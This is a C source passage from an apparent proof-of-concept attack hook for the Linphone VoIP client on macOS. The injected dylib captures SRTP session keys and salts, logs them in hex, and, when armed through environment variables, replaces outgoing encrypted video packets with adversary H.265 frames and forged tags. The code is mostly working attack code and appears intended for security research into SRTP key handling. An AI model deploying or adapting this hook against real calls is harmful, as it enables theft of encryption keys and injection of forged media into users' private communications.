/* Ctor that fires the moment the dylib is dyld-loaded, so we leave a
 * breadcrumb in stderr even if no key is captured during this run. */
/* ---- ms_srtp.cpp observer adapters ---- */
/* These are the functions the SDK patch (poc-linphone/patches/0002-...patch)
 * will call into when the hook is loaded and has registered itself. They
 * delegate to the same logic as the DYLD_INTERPOSE entries above so the
 * key store / inner-session set / substitution path are shared. */
static void observer_inner_send_key(void *sessions, int suite,
                                    const uint8_t *key, size_t key_length,
                                    int source) {
    size_t k_size = 0, s_size = 0;
    int recognized = (suite_dimensions(suite, &k_size, &s_size) == 0) &&
                     (key_length >= k_size + s_size) && (key != NULL);
    (void)sessions;
    if (!recognized) {
        hook_log("observer.inner_send_key suite=%d source=%d len=%zu UNRECOGNIZED",
                 suite, source, key_length);
        return;
    }

    pthread_mutex_lock(&g_store.lock);
    g_store.rotation_count++;

    /* Decide: append to current salt group, or start a new group (=
     * salt rotation). We compare against curr.salt — if curr is empty
     * or its salt differs, this is a new generation. */
    int new_group = 0;
    if (!g_store.curr.valid) {
        new_group = 1;
    } else if (g_store.curr.salt_len != s_size ||
               memcmp(g_store.curr.salt, key + k_size, s_size) != 0) {
        new_group = 1;
    }

    if (new_group) {
        /* Shift current → previous, start new current group. */
        if (g_store.curr.valid) {
            g_store.prev = g_store.curr;
            g_store.salt_rotations++;
        }
        memset(&g_store.curr, 0, sizeof(g_store.curr));
        g_store.curr.valid = 1;
        g_store.curr.salt_len = s_size;
        memcpy(g_store.curr.salt, key + k_size, s_size);
        /* Invalidate cached KDFs — keys at every position changed. */
        for (int p = 0; p < MAX_KEYS_PER_GROUP; p++) g_store.cached_valid[p] = 0;
    }

    /* Append key at next position within current group. */
    int pos = g_store.curr.n_keys;
    int appended = 0;
    if (pos < MAX_KEYS_PER_GROUP) {
        memcpy(g_store.curr.keys[pos], key, k_size);
        g_store.curr.n_keys++;
        appended = 1;
        /* This position's cache is now stale. */
        g_store.cached_valid[pos] = 0;
    }

    int prev_valid = g_store.prev.valid;
    int curr_n = g_store.curr.n_keys;
    char k_hex[65], s_hex[29];
    hex_to(k_hex, key, k_size);
    hex_to(s_hex, key + k_size, s_size);
    pthread_mutex_unlock(&g_store.lock);

    hook_log("observer.inner_send_key #%llu suite=%d source=%d "
             "group=%s pos=%d/%d key=%s salt=%s%s",
             (unsigned long long)g_store.rotation_count, suite, source,
             new_group ? "NEW(curr)" : "curr", pos, MAX_KEYS_PER_GROUP,
             k_hex, s_hex,
             prev_valid ? " (prev group held — attack window OPEN)"
                        : " (no prev group yet — observing)");
    (void)appended; (void)curr_n;
}

static int observer_inner_protect_substitution(void *inner_srtp,
                                               uint8_t *packet,
                                               int *len_in_out) {
    /* The packet here is post-srtp_protect: bytes[0..hdr_len] is the RTP
     * fixed header, bytes[hdr_len..len-16] is the libsrtp K_new ciphertext,
     * and the trailing 16 bytes are the K_new tag. */
    if (!packet || !len_in_out || *len_in_out < 12 + 16) return 0;

    static uint64_t s_observed = 0;
    uint64_t n = __atomic_add_fetch(&s_observed, 1, __ATOMIC_RELAXED);

    int len_in = *len_in_out;
    int cc = packet[0] & 0x0F;
    size_t hdr_len = 12 + 4 * (size_t)cc;
    if (hdr_len + 16 > (size_t)len_in) return 0;
    size_t sender_pt_len = (size_t)len_in - hdr_len - 16;   /* strip the tag */
    /* RTP header: byte 1 high bit = M (marker = 1 on frame-end packet for
     * video streams), low 7 bits = payload type. */
    int marker = (packet[1] & 0x80) ? 1 : 0;
    uint16_t seq  = ((uint16_t)packet[2] << 8) | (uint16_t)packet[3];
    uint32_t ts   = ((uint32_t)packet[4] << 24) | ((uint32_t)packet[5] << 16) |
                    ((uint32_t)packet[6] << 8)  | (uint32_t)packet[7];
    uint32_t ssrc = ((uint32_t)packet[8] << 24) | ((uint32_t)packet[9] << 16) |
                    ((uint32_t)packet[10] << 8) | (uint32_t)packet[11];

    if (!g_arm) {
        if (n <= 3 || (n % 50) == 0) {
            hook_log("observer.protect[observe] #%llu inner_srtp=%p ssrc=%08x "
                     "seq=%u M=%d ts=%u cc=%d hdr=%zu sender_pt=%zu",
                     (unsigned long long)n, inner_srtp, ssrc, seq, marker,
                     ts, cc, hdr_len, sender_pt_len);
        }
        return 0;
    }

    /* Armed: try substitution. The buffer here is exactly what gets
     * handed to the outer SRTP, so overwriting (CT, tag) is sufficient. */
    uint8_t ct[2048];
    uint8_t tag[16];
    size_t target_len = 0;
    int rc = try_substitute(inner_srtp, packet, hdr_len, sender_pt_len, ssrc, seq,
                            marker, &target_len, ct, tag);
    if (rc != 0) {
        if (n <= 3 || (n % 50) == 0) {
            int pos = infer_stream_position(sender_pt_len);
            hook_log("observer.protect[pass-through] #%llu ssrc=%08x seq=%u "
                     "pos=%d sender_pt=%zu (attack window closed or NAL didn't fit)",
                     (unsigned long long)n, ssrc, seq, pos, sender_pt_len);
        }
        return 0;
    }
    memcpy(packet + hdr_len, ct, target_len);
    memcpy(packet + hdr_len + target_len, tag, 16);
    *len_in_out = (int)(hdr_len + target_len + 16);
    if (n <= 5 || (n % 50) == 0) {
        int pos = infer_stream_position_for_ssrc(ssrc, sender_pt_len);
        int ap = adversary_idr_stream_ready() && marker;
        hook_log("observer.protect[ATTACK] #%llu ssrc=%08x seq=%u M=%d "
                 "pos=%d sender_pt=%zu→target_len=%zu mode=%s (ambig bytes written)",
                 (unsigned long long)n, ssrc, seq, marker, pos, sender_pt_len,
                 target_len, ap ? "AP" : "single-NAL");
    }
    return 0;
}

/* ---- SDK observer registration (cross-namespace dlsym workaround) ---- */
static pthread_mutex_t g_register_lock = PTHREAD_MUTEX_INITIALIZER;
static int g_observers_registered = 0;

static void attack_hook_try_register_observers(void) {
    pthread_mutex_lock(&g_register_lock);
    if (g_observers_registered) {
        pthread_mutex_unlock(&g_register_lock);
        return;
    }
    typedef void (*set_send_obs_fn)(void *);
    typedef void (*set_sub_fn)(void *);
    set_send_obs_fn set_send = NULL;
    set_sub_fn set_sub = NULL;

    /* Scan loaded images for one whose path contains "mediastreamer2",
     * dlopen it with RTLD_NOLOAD to get a handle into the already-mapped
     * image, and dlsym the two patch symbols. */
    uint32_t count = _dyld_image_count();
    for (uint32_t i = 0; i < count; i++) {
        const char *name = _dyld_get_image_name(i);
        if (!name || !strstr(name, "mediastreamer2")) continue;
        void *handle = dlopen(name, RTLD_LAZY | RTLD_NOLOAD);
        if (!handle) continue;
        void *s1 = dlsym(handle, "ms_attack_set_inner_send_key_observer");
        void *s2 = dlsym(handle, "ms_attack_set_inner_protect_substitution");
        /* Resolve srtp_get_stream_roc through the same handle —
         * libsrtp is statically linked into libmediastreamer2 so this
         * is where its exported symbols live. */
        void *s3 = dlsym(handle, "srtp_get_stream_roc");
        if (s3) {
            g_get_stream_roc = (get_stream_roc_fn)s3;
        }
        /* Don't dlclose: RTLD_NOLOAD increments the refcount, so
         * dlclose would decrement to zero and could unmap; safer to
         * leak the handle (process-lifetime). */
        if (s1 && s2) {
            set_send = (set_send_obs_fn)s1;
            set_sub  = (set_sub_fn)s2;
            break;
        }
    }

    if (set_send && set_sub) {
        set_send((void *)&observer_inner_send_key);
        set_sub((void *)&observer_inner_protect_substitution);
        g_observers_registered = 1;
        hook_log("registered SDK observers — patch is active (srtp_get_stream_roc=%p)",
                 (void *)g_get_stream_roc);
    }
    pthread_mutex_unlock(&g_register_lock);
}

static void attack_hook_on_image_added(const struct mach_header *mh,
                                       intptr_t slide) {
    (void)mh; (void)slide;
    attack_hook_try_register_observers();
}

__attribute__((constructor))
static void attack_hook_init(void) {
    const char *video = getenv("ATTACK_HOOK_VIDEO");
    if (!video || !*video) {
        video = "src-video/video_01_idr_only.h265";
    }
    /* Load both the legacy per-NAL stream (for the old substitution
     * path that ships a single random NAL + FD_NUT per packet) and the
     * IDR-only AP stream (for the §5.4.2.1 path that ships an entire
     * self-contained H.265 frame as a RFC 7798 Aggregation Packet).
     * The AP path is preferred when ready. */
    if (adversary_nals_load(video) != 0) {
        hook_log("WARNING: failed to load legacy adversary stream at %s", video);
    }
    if (adversary_idr_stream_load(video) != 0) {
        hook_log("WARNING: failed to load IDR-only adversary stream at %s — "
                 "AP-format substitution will fall back to single-NAL mode",
                 video);
    }

    const char *arm = getenv("ATTACK_HOOK_ARM");
    g_arm = (arm && (arm[0] == '1' || arm[0] == 'y' || arm[0] == 'Y'));

    const char *fp = getenv("ATTACK_HOOK_FORCE_POSITION");
    if (fp && fp[0] >= '0' && fp[0] <= '2' && fp[1] == 0) {
        g_force_position = fp[0] - '0';
    }

    hook_log("loaded (interposing inner_send_key, srtp_create, srtp_protect, "
             "srtp_get_stream_roc external) — adversary_video=%s arm=%s "
             "force_position=%d (-1 = size heuristic)",
             video, g_arm ? "YES (will substitute)" : "no (observe-only)",
             g_force_position);

    /* Try to register the SDK-patch observers. macOS uses a two-level
     * namespace and `dlsym(RTLD_DEFAULT, ...)` only sees symbols in the
     * main executable's namespace — the mediastreamer2 framework loaded
     * via @rpath stays out of reach unless we look up its handle
     * explicitly. We register a dyld image-load callback; for every
     * loaded (and future-loaded) image whose path contains
     * "mediastreamer2", we dlopen it with RTLD_NOLOAD (to get a handle
     * to the already-mapped image) and try to resolve the two setter
     * symbols. First success wins, callback short-circuits after.
     *
     * If the SDK was built without patch 0002, no image will export
     * these symbols and we silently fall back to the DYLD_INTERPOSE
     * entries (which are useful on dynamic-libsrtp builds, even if
     * they don't fire on Linphone's static-link build). */
    _dyld_register_func_for_add_image(attack_hook_on_image_added);
    /* Also try right now — any image already loaded at our ctor time. */
    attack_hook_try_register_observers();
}
